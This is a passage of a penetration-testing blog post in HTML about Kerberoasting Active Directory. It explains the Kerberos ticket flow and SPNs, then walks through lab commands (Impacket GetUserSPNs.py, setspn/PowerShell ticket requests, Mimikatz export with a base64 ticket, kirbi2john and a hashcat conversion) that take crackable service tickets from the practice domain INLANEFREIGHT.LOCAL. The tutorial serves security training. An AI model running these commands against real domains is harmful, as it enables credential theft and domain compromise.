+                    <a href="#requesting-a-single-tgs-ticket" aria-label="Requesting a Single TGS Ticket.">Requesting a Single TGS Ticket.</a></li></ul>
+                </li>
+                <li>
+                    <a href="#windows-perspective" aria-label="Windows Perspective">Windows Perspective</a><ul>
+                        
+                <li>
+                    <a href="#enumerating-spns-with-setspnexe" aria-label="Enumerating SPNs with setspn.exe">Enumerating SPNs with setspn.exe</a></li>
+                <li>
+                    <a href="#retrieving-all-tickets-using-setspnexe" aria-label="Retrieving All Tickets using setspn.exe">Retrieving All Tickets using setspn.exe</a></li>
+                <li>
+                    <a href="#targeting-a-single-user" aria-label="Targeting a Single User**************">Targeting a Single User**************</a></li></ul>
+                </li>
+                <li>
+                    <a href="#extracting-tickets-from-memory-with-mimikatz" aria-label="Extracting Tickets from Memory with Mimikatz">Extracting Tickets from Memory with Mimikatz</a><ul>
+                        
+                <li>
+                    <a href="#skipped-version" aria-label="Skipped Version">Skipped Version</a></li>
+                <li>
+                    <a href="#automate-version" aria-label="AUTOMATE VERSION">AUTOMATE VERSION</a></li></ul>
+                </li></ul>
+                </li>
+                <li>
+                    <a href="#rebeus" aria-label="REBEUS">REBEUS</a><ul>
+                        
+                <li>
+                    <a href="#ticket-operations" aria-label="Ticket Operations"><strong>Ticket Operations</strong></a><ul>
+                        
+                <li>
+                    <a href="#asktgt" aria-label="Asktgt">Asktgt</a></li></ul>
+                </li>
+                <li>
+                    <a href="#klist" aria-label="Klist">Klist</a></li>
+                <li>
+                    <a href="#renew" aria-label="Renew">Renew</a></li>
+                <li>
+                    <a href="#golden-ticket" aria-label="Golden Ticket">Golden Ticket</a></li>
+                <li>
+                    <a href="#silver-ticket" aria-label="Silver Ticket">Silver Ticket</a></li>
+                <li>
+                    <a href="#ticket-management" aria-label="Ticket Management">Ticket Management</a>
+                </li>
+            </ul>
+            </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><p><img loading="lazy" src="https://redfoxsec.com/wp-content/uploads/2023/03/attacking-kerberos-part-2-thumbnail.png" alt=""  />
+</p>
+<h2 id="kerberoasting">Kerberoasting<a hidden class="anchor" aria-hidden="true" href="#kerberoasting">#</a></h2>
+<p>The Kerberos protocol defines how clients interact with a network authentication service, clients obtain tickets from the Kerberos Key Distribution Center (KDC) and they submit these tickets to application servers when connections are established. uses port 88 by default and depends on the process of symmetric key cryptography.</p>
+<p><em>NB</em> [<strong><strong>kerberos uses tickets to authenticate a user and completely avoids sending passwords across the network</strong>]</strong></p>
+<p><img loading="lazy" src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*J6UHDf5fnbzdKTPawNq3UA.png" alt=""  />
+</p>
+<h3 id="how-kerb-auth-works">How Kerb Auth works!<a hidden class="anchor" aria-hidden="true" href="#how-kerb-auth-works">#</a></h3>
+<p>In every Active Directory domain, every domain controller runs a KDC service that provides requests for tickets to kerberos, which is the KRBTGT account in the AD domain.</p>
+<p><img loading="lazy" src="https://1.bp.blogspot.com/-XHZj0n9oH_g/XrHWMs_s-uI/AAAAAAAAj2E/oxSrDD2wvOEMv-a-nTHhQD2jc-3KMULYgCLcBGAsYHQ/s1600/1.png" alt="1.webp"  />
+</p>
+<p>Kerberos uses symmetric cryptography for encryption and decryption.</p>
+<p>For explanation purposes, we use three colours to distinguish Hashes:</p>
+<ul>
+<li><strong>BLUE _KEY</strong>: User NTLM HASH</li>
+<li><strong>YELLOW_KEY</strong>: Krbtgt NTLM HASH</li>
+<li><strong>RED_KEY:</strong> Service NTLM HASH</li>
+</ul>
+<p><strong>Step 1:</strong> By sending the request message to KDC, the client initializes communication as:</p>
+<p><em><strong>KRB_AS_REQ contains the following:</strong></em></p>
+<ul>
+<li>The username of the client is to be authenticated.</li>
+<li><em>The service <strong>SPN (SERVICE PRINCIPAL NAME)</strong> linked with the Krbtgt account</em></li>
+<li><em>An encrypted timestamp (Locked with User Hash: Blue Key)</em></li>
+</ul>
+<p>The entire message is encrypted using the User NTLM hash (<strong>Locked with BLUE KEY</strong>) to authenticate the user and prevent replay attacks.</p>
+<p><strong>Step 2:</strong> The KDC uses a database consisting of Users/Krbtgt/Services hashes to decrypt a message (<strong>Unlock with BLUE KEY</strong>) that authenticates user identification.</p>
+<p>Then KDC will generate TGT (Ticket Granting Ticket) for a client that is encrypted using Krbtgt hash (Locked with Yellow Key) &amp; some Encrypted Message using User Hash.</p>
+<p><em><strong>KRB_AS_REP contains the following:</strong></em></p>
+<ul>
+<li><em><strong>Username</strong></em></li>
+<li><em>Some encrypted data, (Locked with User Hash: Blue Key) that contains:</em></li>
+<li><em>Session key</em></li>
+<li><em>The expiration date of TGT</em></li>
+<li><em><strong>TGT</strong>, (Locked with Krbtgt Hash: Yellow Key) which contains:</em></li>
+<li><em>Username</em></li>
+<li><em>Session key</em></li>
+<li><em>The expiration date of TGT</em></li>
+<li><em>PAC with user privileges, signed by KDC</em></li>
+</ul>
+<p><img loading="lazy" src="https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj8cs4DxTHhCqS9yUAa3yOwC8e3ElB50XZ4QyOkWXIEAGssMdjBPNsGVaDz274Z8voKtHNoBHD9qD6PKPvp9KLzdxjUzRtSc_UQ7Jz03v5BHEwhP7wm09K-81SGcv3qTyJ1UDyctCHyDc_PgLZbe4A5GipaqZmDU649RWcNbQtIpM6o6DvKicqXTU5vQA/s16000/2.png?w=640&amp;ssl=1" alt="https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj8cs4DxTHhCqS9yUAa3yOwC8e3ElB50XZ4QyOkWXIEAGssMdjBPNsGVaDz274Z8voKtHNoBHD9qD6PKPvp9KLzdxjUzRtSc_UQ7Jz03v5BHEwhP7wm09K-81SGcv3qTyJ1UDyctCHyDc_PgLZbe4A5GipaqZmDU649RWcNbQtIpM6o6DvKicqXTU5vQA/s16000/2.png?w=640&amp;amp;ssl=1"  />
+</p>
+<p><strong>Step 3:</strong> The KRB_TGT will be stored in the Kerberos tray (Memory) of the client machine, as the user already has the KRB_TGT, which is used to identify himself for the TGS request. The client sent a copy of the TGT with the encrypted data to KDC.</p>
+<p><em><strong>KRB_TGS_REQ</strong> contains:</em></p>
+<ul>
+<li><em>Encrypted data with the session key</em></li>
+<li><em>Username</em></li>
+<li><em>Timestamp</em></li>
+<li><em>TGT</em></li>
+<li><em>SPN of requested service e.g. SQL service</em></li>
+</ul>
+<p><strong>Step 4:</strong> The KDC receives the KRB_TGS_REQ message and decrypts the message using Krbtgt hash to verify TGT (Unlock using Yellow key), then KDC returns a TGS as KRB_TGS_REP which is encrypted using requested service hash <strong>(Locked with Red Key)</strong> &amp; Some Encrypted Message using User Hash.</p>
+<p><em><strong>KRB_TGS_REP contains:</strong></em></p>
+<ul>
+<li><em>Username</em></li>
+<li><em>Encrypted data with the session key:</em></li>
+<li><em>Service session key</em></li>
+<li><em>The expiration date of TGS</em></li>
+<li><em><strong>TGS</strong>, (Service Hash: RED Key) which contains:</em></li>
+<li><em>Service session key</em></li>
+<li><em>Username</em></li>
+<li><em>The expiration date of TGS</em></li>
+<li><em>PAC with user privileges, signed by KDC</em></li>
+</ul>
+<p><img loading="lazy" src="https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgEljfKE_fFEoR8kThrILtnjmFwQPfM61p-SZh6Xg64sLUv7GzLgsvk6Ni5YhC8A7ILETnBFHbsa2ldkL6u1mrWGkDStzkFSP9oCeg3cO_9QxjyltM0ZpKm5Jf2oV8lo-IsfR2C7-jAAaRyWTu_Sofn4TV7BhIl0fj5fYPIicSjbScOtyUql25EmTo-Tw/s16000/3.png?w=640&amp;ssl=1" alt="https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgEljfKE_fFEoR8kThrILtnjmFwQPfM61p-SZh6Xg64sLUv7GzLgsvk6Ni5YhC8A7ILETnBFHbsa2ldkL6u1mrWGkDStzkFSP9oCeg3cO_9QxjyltM0ZpKm5Jf2oV8lo-IsfR2C7-jAAaRyWTu_Sofn4TV7BhIl0fj5fYPIicSjbScOtyUql25EmTo-Tw/s16000/3.png?w=640&amp;amp;ssl=1"  />
+</p>
+<p><strong>Step 5:</strong> The user sends the copy of TGS to the Application Server,</p>
+<p><em><strong>KRB_AP_REQ contains:</strong></em></p>
+<ul>
+<li><em>TGS</em></li>
+<li><em>Encrypted data with the service session key:</em></li>
+<li><em>Username</em></li>
+<li><em>Timestamp, to avoid replay attacks</em></li>
+</ul>
+<p><strong>Step 6:</strong> The application attempts to decrypt the message using its NTLM hash and to verify the PAC from KDC to identify user Privilege which is an optional case.</p>
+<p><strong>Step 7:</strong>  KDC verifies PAC (Optional)</p>
+<p><strong>Step 8:</strong>  Allow the user to access the service for a specific time.</p>
+<h2 id="spns">SPNs<a hidden class="anchor" aria-hidden="true" href="#spns">#</a></h2>
+<p>The Service Principal Name (SPN) is a unique identifier for a service instance. Active Directory Domain Services and Windows provide support for Service Principal Names (SPNs), which are key components of the Kerberos mechanism through which a client authenticates a service.</p>
+<p><strong>Important Points</strong></p>
+<ul>
+<li>If you install multiple instances of a service on computers throughout a forest, each instance must have its SPN.</li>
+<li>Before the Kerberos authentication service can use an SPN to authenticate a service, the SPN must be registered on the account.</li>
+<li>A given SPN can be registered on only one account.</li>
+<li>An SPN must be unique in the forest in which it is registered.</li>
+<li>If it is not unique, authentication will fail.</li>
+</ul>
+<h3 id="spns-syntax">SPNS syntax<a hidden class="anchor" aria-hidden="true" href="#spns-syntax">#</a></h3>
+<p><strong>The SPN syntax has four elements</strong></p>
+<p><img loading="lazy" src="https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh5w4iPbIsIxS5VNUzD13_nOXg-0AbmhtwdJWBUqi4keSFbajcnh5Bgqro7FOj686VwDTBbtu0oYjZbBGRyRWxUHy8EAJp8jmUQpDBymwTWzE_9RIpwOkK2Ul6bxIbDZSwHYhknzECBwjBEd4VU5HyMeCciosGRPfcjbaN62fLe6WPiArdLqlHrpGMKOQ/s16000/5.png?w=640&amp;ssl=1" alt="https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh5w4iPbIsIxS5VNUzD13_nOXg-0AbmhtwdJWBUqi4keSFbajcnh5Bgqro7FOj686VwDTBbtu0oYjZbBGRyRWxUHy8EAJp8jmUQpDBymwTWzE_9RIpwOkK2Ul6bxIbDZSwHYhknzECBwjBEd4VU5HyMeCciosGRPfcjbaN62fLe6WPiArdLqlHrpGMKOQ/s16000/5.png?w=640&amp;amp;ssl=1"  />
+</p>
+<h3 id="type-of-spn">Type of SPN<a hidden class="anchor" aria-hidden="true" href="#type-of-spn">#</a></h3>
+<ul>
+<li>Host-based SPNs which is associated with the computer account in AD, it is randomly generated 128-character long password which is changed every 30 days; hence it is no use in Kerberoasting attacks</li>
+<li>SPNs that have been associated with a domain user account where NTLM hash will be used.</li>
+</ul>
+<h3 id="linux-perspective">Linux Perspective<a hidden class="anchor" aria-hidden="true" href="#linux-perspective">#</a></h3>
+<h4 id="attack-procedure">Attack Procedure.<a hidden class="anchor" aria-hidden="true" href="#attack-procedure">#</a></h4>
+<p>Depending on your positioning a network, Kerberos attacks can be performed in multiple ways.</p>
+<ul>
+<li>From a non-domain joined Linux host using valid domain user credentials.</li>
+<li>From a domain-joined Linux host as root after retrieving the keytab file.</li>
+<li>From a domain-joined Windows, the host is authenticated as a domain user.</li>
+<li>From a domain-joined Windows host with a shell in the context of a domain account.</li>
+<li>As SYSTEM on a domain-joined Windows host.</li>
+<li>From a non-domain joined Windows host using <a href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc771525(v=ws.11)">runas</a> /netonly.</li>
+</ul>
+<h4 id="tools">Tools.<a hidden class="anchor" aria-hidden="true" href="#tools">#</a></h4>
+<p>Some tools can be utilized to perform the attack.</p>
+<ul>
+<li>Impacket’s <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py">GetUserSPNs.py</a> from a non-domain joined Linux host.</li>
+<li>A combination of the built-in setspn.exe Windows binary, PowerShell, and Mimikatz.</li>
+<li>From Windows, utilizing tools such as PowerView, <a href="https://github.com/GhostPack/Rubeus">Rubeus</a>, and other PowerShell scripts.</li>
+</ul>
+<p><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>REMEMBER!!!</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></p>
+<p>Obtaining a TGS ticket via kerberoasting does not guarantee a set of valid credentials and the ticket still must be cracked offline to obtain the cleartext password.</p>
+<p>TGS tickets generally take longer to crack than other formats such as NTLM hashes, so often, unless a weak password is set, it can be difficult or impossible to obtain the cleartext using s standard cracking rig.</p>
+<h4 id="the-efficiency-of-attack">The efficiency of Attack<a hidden class="anchor" aria-hidden="true" href="#the-efficiency-of-attack">#</a></h4>
+<p>While it can be a great way to move lateral or escalate privileges in a domain kerberoasting and the presence of SPNs does not guarantee us any level of access.</p>
+<p>We might be in an environment where we crack a TGS ticket and obtain Domain Admin access straightway or obtain credentials that help us move down the path to domain compromise. Other times we may perform the attack and retrieve many TGS tickets, some of which we can crack, but none of the ones that crack are for privileged users, and the attack does not gain us any additional access.</p>
+<p><strong>N/B -</strong> When writing a report this finding is termed as high-risk in the first two cases. Third case we may Kerberos and end up unable to crack a single TGS ticket even after mad days of cracking attempts with Hashcat. This would be dropped as a medium-risk issue to make the client aware of the risk of SPNs in the domain.</p>
+<p><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>REMEMBER!!!</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></p>
+<p>A prerequisite to performing Kerberoasting attacks is either domain user credentials (cleartext or just an NTLM hash if using Impacket), a shell in the context of a domain user, or account such as SYSTEM. Once we have this level of access, we can start. We must also know which host in the domain is a Domain Controller so we can query it.</p>
+<h4 id="getuserspnspy">GetUserSPNs.py<a hidden class="anchor" aria-hidden="true" href="#getuserspnspy">#</a></h4>
+<p><strong>Listing SPN Accounts.</strong></p>
+<p><code>GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend</code></p>
+<h4 id="requesting-all-tgs-tickets">Requesting all TGS tickets.**<a hidden class="anchor" aria-hidden="true" href="#requesting-all-tgs-tickets">#</a></h4>
+<p>Later on, we can pull all TGS tickets for offline processing using the <strong>-request</strong> flag. The TGS tickets will be output in a format that can be readily provided to Hashcat or Johnny for offline password-cracking attempts.</p>
+<p><code>GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request</code></p>
+<h4 id="requesting-a-single-tgs-ticket">Requesting a Single TGS Ticket.<a hidden class="anchor" aria-hidden="true" href="#requesting-a-single-tgs-ticket">#</a></h4>
+<p>Wte can also be more targeted and request just the TGS ticket for a specific account. Let&rsquo;s try requesting one for just the required account.</p>
+<p><code>GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user</code></p>
+<p>With this ticket in hand, we could attempt, to crack the password offline, if successful we may end up with Domain Admin Rights.</p>
+<p>Saving the Ticket o facilitate offline cracking, it is always good to use the <code>-outputfile</code> flag to write the TGS tickets to a file that can then be run using Hashcat on our attack system or moved to a GPU cracking rig.</p>
+<p><code>GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs</code></p>
+<h3 id="windows-perspective">Windows Perspective<a hidden class="anchor" aria-hidden="true" href="#windows-perspective">#</a></h3>
+<p>Kerberoasting - Semi-Manual Method.</p>
+<h4 id="enumerating-spns-with-setspnexe">Enumerating SPNs with setspn.exe<a hidden class="anchor" aria-hidden="true" href="#enumerating-spns-with-setspnexe">#</a></h4>
+<p><code>setspn.exe -Q */*</code> running the command you’ll notice many different SPNs returned for the various hosts in the domain.</p>
+<h4 id="retrieving-all-tickets-using-setspnexe">Retrieving All Tickets using setspn.exe<a hidden class="anchor" aria-hidden="true" href="#retrieving-all-tickets-using-setspnexe">#</a></h4>
+<p><code>setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }</code></p>
+<p>The above command combines the previous command with <code>setspn.exe</code> to request tickets for all accounts with SPNs set.</p>
+<p>Using <strong><strong><strong><strong><strong><strong><strong><strong><strong>Powershell</strong></strong></strong></strong></strong></strong></strong></strong></strong> we can request TGS tickets for an account in the shell and load them into memory, once they are loaded into memory we can extract them using <strong>Mimkatz.</strong></p>
+<h4 id="targeting-a-single-user">Targeting a Single User**************<a hidden class="anchor" aria-hidden="true" href="#targeting-a-single-user">#</a></h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>PS C:\htb&gt; Add-Type -AssemblyName System.IdentityModel
+</span></span><span style="display:flex;"><span>PS C:\htb&gt; New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList <span style="color:#e6db74">&#34;MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433&#34;</span>
+</span></span></code></pre></div><p>Before moving on, let&rsquo;s break down the commands above to see what we are doing (which is essentially what is used by <a href="https://posts.specterops.io/kerberoasting-revisited-d434351bd4d1">Rubeus</a> when using the default Kerberoasting method):</p>
+<ul>
+<li>The <a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/add-type?view=powershell-7.2">Add-Type</a> cmdlet is used to add a .NET framework class to our PowerShell session, which can then be instantiated like any .NET framework object</li>
+<li>The <code>AssemblyName</code> parameter allows us to specify an assembly that contains types that we are interested in using</li>
+<li><a href="https://docs.microsoft.com/en-us/dotnet/api/system.identitymodel?view=netframework-4.8">System.IdentityModel</a> is a namespace that contains different classes for building security token services</li>
+<li>We&rsquo;ll then use the <a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/new-object?view=powershell-7.2">New-Object</a> cmdlet to create an instance of a .NET Framework object</li>
+<li>We&rsquo;ll use the <a href="https://docs.microsoft.com/en-us/dotnet/api/system.identitymodel.tokens?view=netframework-4.8">System.IdentityModel.Tokens</a> namespace with the <a href="https://docs.microsoft.com/en-us/dotnet/api/system.identitymodel.tokens.kerberosrequestorsecuritytoken?view=netframework-4.8">KerberosRequestorSecurityToken</a> class to create a security token and pass the SPN name to the class to request a Kerberos TGS ticket for the target account in our current logon session</li>
+</ul>
+<p>We can also choose to retrieve all tickets using the same method, but this will also pull all computer accounts, so it is not optimal.</p>
+<p>Now that the tickets are loaded, we can use <code>Mimikatz</code> to extract the ticket(s) from <code>memory</code>.</p>
+<h3 id="extracting-tickets-from-memory-with-mimikatz">Extracting Tickets from Memory with Mimikatz<a hidden class="anchor" aria-hidden="true" href="#extracting-tickets-from-memory-with-mimikatz">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>        Using <span style="color:#e6db74">&#39;mimikatz.log&#39;</span> <span style="color:#66d9ef">for</span> logfile <span style="color:#960050;background-color:#1e0010">:</span> OK
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        mimikatz <span style="color:#75715e"># base64 /out:true</span>
+</span></span><span style="display:flex;"><span>        isBase64InterceptInput  is false
+</span></span><span style="display:flex;"><span>        isBase64InterceptOutput is true
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        mimikatz <span style="color:#75715e"># kerberos::list /export</span>
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        &lt;SNIP&gt;
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        [<span style="color:#ae81ff">00000002</span>] - 0x00000017 - rc4_hmac_nt
+</span></span><span style="display:flex;"><span>           Start/<span style="color:#66d9ef">End</span>/MaxRenew<span style="color:#960050;background-color:#1e0010">:</span> <span style="color:#ae81ff">2</span>/<span style="color:#ae81ff">24</span>/<span style="color:#ae81ff">2022</span> <span style="color:#ae81ff">3</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">36</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">22</span> PM ; <span style="color:#ae81ff">2</span>/<span style="color:#ae81ff">25</span>/<span style="color:#ae81ff">2022</span> <span style="color:#ae81ff">12</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">55</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">25</span> AM ; <span style="color:#ae81ff">3</span>/<span style="color:#ae81ff">3</span>/<span style="color:#ae81ff">2022</span> <span style="color:#ae81ff">2</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">55</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">25</span> PM
+</span></span><span style="display:flex;"><span>           Server Name<span style="color:#960050;background-color:#1e0010">:</span> MSSQLSvc/DEV-PRE-SQL.inlanefreight.local<span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">1433</span> @ INLANEFREIGHT.LOCAL
+</span></span><span style="display:flex;"><span>           Client Name<span style="color:#960050;background-color:#1e0010">:</span> htb-student @ INLANEFREIGHT.LOCAL
+</span></span><span style="display:flex;"><span>           Flags 40a10000    <span style="color:#960050;background-color:#1e0010">:</span> name_canonicalize ; pre_authent ; renewable ; forwardable ;
+</span></span><span style="display:flex;"><span>        ====================
+</span></span><span style="display:flex;"><span>        Base64 of file <span style="color:#960050;background-color:#1e0010">:</span> <span style="color:#ae81ff">2</span>-40a10000-htb-student@MSSQLSvc~DEV-PRE-SQL.inlanefreight.local~<span style="color:#ae81ff">1433</span>-INLANEFREIGHT.LOCAL.kirbi
+</span></span><span style="display:flex;"><span>        ====================
+</span></span><span style="display:flex;"><span>        doIGPzCCBjugAwIBBaEDAgEWooIFKDCCBSRhggUgMIIFHKADAgEFoRUbE0lOTEFO
+</span></span><span style="display:flex;"><span>        RUZSRUlHSFQuTE9DQUyiOzA5oAMCAQKhMjAwGwhNU1NRTFN2YxskREVWLVBSRS1T
+</span></span><span style="display:flex;"><span>        UUwuaW5sYW5lZnJlaWdodC5sb2NhbDoxNDMzo4IEvzCCBLugAwIBF6EDAgECooIE
+</span></span><span style="display:flex;"><span>        rQSCBKmBMUn7JhVJpqG0ll7UnRuoeoyRtHxTS8JY1cl6z0M4QbLvJHi0JYZdx1w5
+</span></span><span style="display:flex;"><span>        sdzn9Q3tzCn8ipeu+NUaIsVyDuYU/LZG4o2FS83CyLNiu/r2Lc2ZM8Ve/rqdd+TG
+</span></span><span style="display:flex;"><span>        xvUkr+5caNrPy2YHKRogzfsO8UQFU1anKW4ztEB1S+f4d1SsLkhYNI4q67cnCy00
+</span></span><span style="display:flex;"><span>        UEf4gOF6zAfieo91LDcryDpi1UII0SKIiT0yr9IQGR3TssVnl70acuNac6eCC+Uf
+</span></span><span style="display:flex;"><span>        vyd7g9gYH/9aBc8hSBp7RizrAcN2HFCVJontEJmCfBfCk0Ex23G8UULFic1w7S6/
+</span></span><span style="display:flex;"><span>        V9yj9iJvOyGElSk1VBRDMhC41712/sTraKRd7rw+fMkx7YdpMoU2dpEj9QQNZ3GR
+</span></span><span style="display:flex;"><span>        XNvGyQFkZp+sctI6Yx/vJYBLXI7DloCkzClZkp7c40u+5q/xNby7smpBpLToi5No
+</span></span><span style="display:flex;"><span>        ltRmKshJ9W19aAcb4TnPTfr2ZJcBUpf5tEza7wlsjQAlXsPmL3EF2QXQsvOc74Pb
+</span></span><span style="display:flex;"><span>        TYEnGPlejJkSnzIHs4a0wy99V779QR4ZwhgUjRkCjrAQPWvpmuI6RU9vOwM50A0n
+</span></span><span style="display:flex;"><span>        h580JZiTdZbK2tBorD2BWVKgU/h9h7JYR4S52DBQ7qmnxkdM3ibJD0o1RgdqQO03
+</span></span><span style="display:flex;"><span>        TQBMRl9lRiNJnKFOnBFTgBLPAN7jFeLtREKTgiUC1/aFAi5h81aOHbJbXP5aibM4
+</span></span><span style="display:flex;"><span>        eLbj2wXp2RrWOCD8t9BEnmat0T8e/O3dqVM52z3JGfHK/5aQ5Us+T5qM9pmKn5v1
+</span></span><span style="display:flex;"><span>        XHou0shzgunaYPfKPCLgjMNZ8+9vRgOlry/CgwO/NgKrm8UgJuWMJ/skf9QhD0Uk
+</span></span><span style="display:flex;"><span>        T9cUhGhbg3/pVzpTlk1UrP3n+WMCh2Tpm+p7dxOctlEyjoYuQ9iUY4KI6s6ZttT4
+</span></span><span style="display:flex;"><span>        tmhBUNua3EMlQUO3fzLr5vvjCd3jt4MF/fD+YFBfkAC4nGfHXvbdQl4E++Ol6/LX
+</span></span><span style="display:flex;"><span>        ihGjktgVop70jZRX+2x4DrTMB9+mjC6XBUeIlS9a2Syo0GLkpolnhgMC/ZYwF0r4
+</span></span><span style="display:flex;"><span>        MuWZu1/KnPNB16EXaGjZBzeW3/vUjv6ZsiL0J06TBm3mRrPGDR3ZQHLdEh3QcGAk
+</span></span><span style="display:flex;"><span>        0Rc4p16+tbeGWlUFIg0PA66m01mhfzxbZCSYmzG25S0cVYOTqjToEgT7EHN0qIhN
+</span></span><span style="display:flex;"><span>        yxb2xZp2oAIgBP2SFzS4cZ6GlLoNf4frRvVgevTrHGgba1FA28lKnqf122rkxx+<span style="color:#ae81ff">8</span>
+</span></span><span style="display:flex;"><span>        ECSiW3esAL3FSdZjc9OQZDvo8QB5MKQSTpnU/LYXfb1WafsGFw07inXbmSgWS1Xk
+</span></span><span style="display:flex;"><span>        VNCOd/kXsd0uZI2cfrDLK4yg7/ikTR6l/dZ+Adp5BHpKFAb3YfXjtpRM6+1FN56h
+</span></span><span style="display:flex;"><span>        TnoCfIQ/pAXAfIOFohAvB5Z6fLSIP0TuctSqejiycB53N0AWoBGT9bF4409M8tjq
+</span></span><span style="display:flex;"><span>        32UeFiVp60IcdOjV4Mwan6tYpLm2O6uwnvw0J+Fmf5x3Mbyr42RZhgQKcwaSTfXm
+</span></span><span style="display:flex;"><span>        5oZV57Di6I584CgeD1VN6C2d5sTZyNKjb85lu7M3pBUDDOHQPAD9l4Ovtd8O6Pur
+</span></span><span style="display:flex;"><span>        +jWFIa2EXm0H/efTTyMR665uahGdYNiZRnpm+ZfCc9LfczUPLWxUOOcaBX/uq6OC
+</span></span><span style="display:flex;"><span>        AQEwgf6gAwIBAKKB9gSB832B8DCB7aCB6jCB5zCB5KAbMBmgAwIBF6ESBBB3DAVi
+</span></span><span style="display:flex;"><span>        Ys6KmIFpubCAqyQcoRUbE0lOTEFORUZSRUlHSFQuTE9DQUyiGDAWoAMCAQGhDzAN
+</span></span><span style="display:flex;"><span>        GwtodGItc3R1ZGVudKMHAwUAQKEAAKURGA8yMDIyMDIyNDIzMzYyMlqmERgPMjAy
+</span></span><span style="display:flex;"><span>        MjAyMjUwODU1MjVapxEYDzIwMjIwMzAzMjI1NTI1WqgVGxNJTkxBTkVGUkVJR0hU
+</span></span><span style="display:flex;"><span>        LkxPQ0FMqTswOaADAgECoTIwMBsITVNTUUxTdmMbJERFVi1QUkUtU1FMLmlubGFu
+</span></span><span style="display:flex;"><span>        ZWZyZWlnaHQubG9jYWw6MTQzMw==
+</span></span><span style="display:flex;"><span>        ====================
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>           * Saved to file     <span style="color:#960050;background-color:#1e0010">:</span> <span style="color:#ae81ff">2</span>-40a10000-htb-student@MSSQLSvc~DEV-PRE-SQL.inlanefreight.local~<span style="color:#ae81ff">1433</span>-INLANEFREIGHT.LOCAL.kirbi
+</span></span></code></pre></div><p>If we don’t specify the <strong>base64 /out:true</strong> command, Mimikatz will extract the tickets and write the to <strong>.kirbi</strong> files.</p>
+<p>Next, you prepare the base blob for cracking <code>echo &quot;&lt;base64 blob&gt;&quot; |  tr -d \\n</code> then place the above into a file and convert it back to a <strong>.kirbi</strong> file using the base64 utility.<code>cat encoded_file | base64 -d &gt; sqldev.kirbi</code></p>
+<p>Extract the kerberos ticket using <a href="http://kirbi2john.py">kirbi2john.py</a> this will create a file called <strong>crack_file,</strong> which then must be modified to be able to use Hashcat against the hash <code>python2.7 kirbi2john.py sqldev.kirbi</code></p>
+<p>Modifying the crack file for hashcat <code>sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file &gt; sqldev_tgs_hashcat</code> now you can run the ticket through hashcat and get a clear password.</p>
+<h4 id="skipped-version">Skipped Version<a hidden class="anchor" aria-hidden="true" href="#skipped-version">#</a></h4>
+<p>So if we decide to skip the base64 output with mimkatz and type <strong>mimikatz # kerberos::list /export,</strong> the <strong>.kirbi</strong> file will be written to disk, in this case, you can download the file and run <strong><a href="http://kirbi2john.py">kirbi2john.py</a></strong> against them directly, skipping the base64 decoding step.</p>
+<h4 id="automate-version">AUTOMATE VERSION<a hidden class="anchor" aria-hidden="true" href="#automate-version">#</a></h4>
+<p>Using <a href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1">PowerView</a> to extract the TGS ticket and convert them to Hashcat format.</p>
+<p><strong>Extracting TGS Ticket</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>        PS C:\htb&gt; Import-Module .\PowerView.ps1
